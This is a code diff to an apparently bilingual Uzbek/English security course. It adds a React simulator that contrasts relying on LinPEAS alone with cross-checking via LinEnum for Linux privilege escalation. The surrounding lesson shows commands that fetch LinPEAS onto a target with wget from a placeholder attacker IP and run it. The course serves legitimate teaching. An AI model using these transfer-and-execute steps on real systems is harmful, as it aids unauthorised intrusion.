@@ -1548,6 +1548,46 @@ function ThoroughEnumSim(){
       React.createElement("button",{onClick:()=>{setRun("thorough");setStep(-1);},style:{flex:1,padding:"9px",background:run==="thorough"?A+"22":SL2,color:run==="thorough"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Puxta (hammasini tekshirish)","✅ Thorough (check everything)"))));
 }
 
+function AutoToolVerifySim(){
+  const lang=useLang();
+  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
+  const SINGLE=[
+    {col:BL,uz:"LinPEAS ishga tushiriladi — natija: hech qanday qizil (yuqori xavf) topilma yo'q",en:"LinPEAS is run — result: no red (high-risk) findings at all",duz:"Chiqish uzun, lekin hech narsa alohida ajralib turmaydi.",den:"The output is long, but nothing stands out."},
+    {col:AM,uz:"Xulosa: «tizim toza» deb qaror qilinadi, boshqa vosita sinalmaydi",en:"Conclusion: the system is judged «clean», no other tool is tried",duz:"Bitta vosita — bitta nuqtai nazar.",den:"One tool — one point of view."},
+    {col:AM,uz:"Aslida: nishonda Python yo'q edi — LinPEAS'ning ba'zi tekshiruvlari sukut saqladi",en:"In reality: Python wasn't on the target — some of LinPEAS's checks stayed silent",duz:"Vosita ishlamadi emas — faqat ba'zi qismlari sukut saqladi, buni sezish qiyin.",den:"The tool didn't fail outright — some parts just went quiet, hard to notice.",final:false},
+    {col:D,uz:"❌ Haqiqiy vektor (yoziladigan cron skripti) sezilmay qoldi — soxta salbiy",en:"❌ The real vector (a writable cron script) went unnoticed — a false negative",duz:"§4 dagi InfoBox aynan shu haqida ogohlantiradi.",den:"The §4 InfoBox warns about exactly this.",final:true,bad:true}
+  ];
+  const CROSS=[
+    {col:BL,uz:"LinPEAS ishga tushiriladi — xuddi shu «toza» natija chiqadi",en:"LinPEAS is run — the exact same «clean» result comes out",duz:"Birinchi qadam ikkala ssenariyda ham bir xil.",den:"The first step is identical in both scenarios."},
+    {col:AM,uz:"Qoidaga ko'ra ikkinchi vosita ham sinaladi: LinEnum (bash asosida, Python'ga bog'liq emas)",en:"As a rule, a second tool is also tried: LinEnum (bash-based, no Python dependency)",duz:"§3 dagi «bir nechtasini bilib oling» maslahatiga amal qilinadi.",den:"Following §3's advice to know several tools."},
+    {col:AM,uz:"LinEnum: /etc/crontab'da yoziladigan skriptni topadi va sariq rangda belgilaydi",en:"LinEnum: finds the writable script in /etc/crontab and flags it in yellow",duz:"LinPEAS o'tkazib yuborgan aynan shu vektor.",den:"Exactly the vector LinPEAS missed."},
+    {col:A,uz:"✅ Ikki vosita bir-birini to'ldirdi — haqiqiy vektor qo'lga kiritildi",en:"✅ The two tools complemented each other — the real vector was caught",duz:"Hech bir vosita mukammal emas, lekin ikkitasi birga ko'proq narsani qamrab oladi.",den:"No tool is perfect, but two together cover much more ground.",final:true}
+  ];
+  const [run,setRun]=useState(null);
+  const [step,setStep]=useState(-1);
+  useEffect(()=>{
+    if(run==null){setStep(-1);return;}
+    const list=run==="single"?SINGLE:CROSS;
+    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
+    if(step>=list.length-1) return;
+    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
+  },[run,step]);
+  const list=run==="single"?SINGLE:run==="cross"?CROSS:null;
+  const cur=list&&step>=0?list[step]:null;
+  return React.createElement("div",{style:{margin:"14px 0"}},
+    React.createElement("div",{style:{minHeight:50}},
+      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu nishonni bitta vosita va ikkinchi vosita bilan tekshirib solishtiring.","⬇ Pick a scenario — check the same target with one tool versus a second cross-check tool.")):
+      list.map(function(s,i){ if(step<i) return null;
+        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
+          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
+          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
+    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
+      run==="single"?t(lang,"✗ Bitta vosita: soxta salbiy yashirin qoldi","✗ One tool: a false negative stayed hidden"):t(lang,"✓ Ikki vosita: bir-birini to'ldirib, vektor topildi","✓ Two tools: complemented each other and caught the vector")),
+    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
+      React.createElement("button",{onClick:()=>{setRun("single");setStep(-1);},style:{flex:1,padding:"9px",background:run==="single"?D+"22":SL2,color:run==="single"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"❌ Bitta vositaga ishonish","❌ Trust one tool")),
+      React.createElement("button",{onClick:()=>{setRun("cross");setStep(-1);},style:{flex:1,padding:"9px",background:run==="cross"?A+"22":SL2,color:run==="cross"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Ikkinchi vosita bilan tekshirish","✅ Cross-check with a second tool"))));
+}
+
 function LessonL01(){
   const lang=useLang();
   return React.createElement("section",null,
@@ -2999,7 +3039,10 @@ function LessonL33(){
     ]}),
     React.createElement(H2,{num:"§3"},t(lang,"Muhit vositani tanlaydi","The environment picks the tool")),
     React.createElement(P,null,t(lang,"Nishonning muhiti siz foydalana oladigan vositaga ta'sir qiladi. Masalan, agar nishonda Python o'rnatilmagan bo'lsa, Python'da yozilgan vositani ishga tushira olmaysiz; shuning uchun bash asosidagi LinPEAS/LinEnum ko'pincha ishonchliroq. Faqat bitta vositaga tayanmang — bir nechtasi bilan tanish bo'ling, chunki har biri boshqasi o'tkazib yuborgan narsani topishi mumkin.","The target's environment affects which tool you can use. For example, if Python isn't installed on the target you can't run a Python tool; that's why the bash-based LinPEAS/LinEnum are often more reliable. Don't rely on a single tool — know several, because each may catch what another missed.")),
-    React.createElement(H2,{num:"§4"},t(lang,"Ishlatish","Usage")),
+    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: bitta vosita vs ikkinchi vosita bilan tekshirish","Interactive simulator: one tool vs cross-checking with a second")),
+    React.createElement(P,null,t(lang,"§3 dagi maslahatni his qiling — xuddi shu nishonni ikki yondashuv bilan tekshiring:","Feel the §3 advice for yourself — check the exact same target two different ways:")),
+    React.createElement(AutoToolVerifySim),
+    React.createElement(H2,{num:"§5"},t(lang,"Ishlatish","Usage")),
     React.createElement(P,null,t(lang,"Vosita nishonda bo'lmasa, uni o'z mashinangizdan uzatasiz: hujum mashinangizda oddiy HTTP server ko'tarib, nishonda wget bilan yuklab olasiz. So'ng unga bajarish huquqini berib (chmod +x), ishga tushirasiz.","If the tool isn't on the target, you transfer it from your machine: start a simple HTTP server on your attack box and download it on the target with wget. Then give it execute permission (chmod +x) and run it.")),
     React.createElement(Terminal,null,"# Hujum mashinasida (LinPEAS joylashgan papkada):\npython3 -m http.server 8000\n\n# Nishon tizimda:\nwget http://<HUJUM-IP>:8000/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh | tee linpeas_natija.txt   # natijani ham saqlaymiz"),
     React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"Avtomatik vositalar soxta ijobiy (mavjud bo'lmagan zaiflikni ko'rsatish) va soxta salbiy (mavjud zaiflikni o'tkazib yuborish) natijalar berishi mumkin. Ularning topilmalarini har doim qo'lda tasdiqlang.","Automated tools can produce false positives (reporting a vuln that isn't there) and false negatives (missing one that is). Always verify their findings manually.")),
